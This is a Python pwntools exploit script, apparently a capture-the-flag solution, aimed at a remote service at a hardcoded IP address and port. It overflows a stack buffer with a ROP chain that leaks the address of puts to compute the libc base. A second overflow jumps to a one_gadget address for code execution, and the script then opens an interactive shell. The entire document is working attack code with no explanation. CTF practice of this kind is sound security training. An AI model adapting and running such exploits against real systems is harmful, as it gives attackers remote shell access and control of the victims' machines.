from pwn import *

my_proc = remote("34.185.184.46",32581)

my_proc.recvuntil("Are you a good ropper?\n")


start_point = 0x400679
puts_plt = 0x004004e0
puts_got = 0x00601018
gadget = 0x400763

#exploit number 1

payload = b""
payload += b"A"*264
payload += p64(gadget)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(start_point)

my_proc.sendline(payload)

puts_addr = my_proc.recvline()[:-1].ljust(8, b"\x00")
puts_addr = u64(puts_addr)
log.info('puts address: ' + hex(puts_addr))

puts_offset = 0x06f690
libc_base = puts_addr - puts_offset
log.info('LIBC base address: ' + hex(libc_base))


# exploit number 2

one_gadget_offset = 0x4526a
one_gadget_address = libc_base + one_gadget_offset
log.info('One gadget address: ' + hex(one_gadget_address))

my_proc.recvuntil("Are you a good ropper?\n")

payload2 = b""
payload2 += b"A" * 264
payload2 += p64(one_gadget_address)

my_proc.sendline(payload2)


my_proc.interactive()
